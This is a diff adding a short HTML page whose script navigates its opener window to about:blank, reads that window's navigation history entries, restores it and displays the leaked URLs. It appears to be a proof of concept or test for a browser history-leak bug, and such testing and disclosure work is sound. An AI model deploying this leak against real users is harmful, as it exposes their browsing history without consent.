@@ -1,0 +1,22 @@
+<html>
+  <head></head>
+  <body>
+    <script>
+      let w = window.opener;
+      w.location = "about:blank";
+      setTimeout(() => {
+        let entries = w.navigation.entries();
+        w.history.back(); // To restore the page after the leak
+        let target = document.getElementById("x");
+        target.innerHTML = "";
+        for (e of entries) {
+          target.append(e.url);
+          target.append(document.createElement("br"));
+        }
+      }, 400);
+    </script>
+    <div>
+      <div id="x"></div>
+    </div>
+  </body>
+</html>
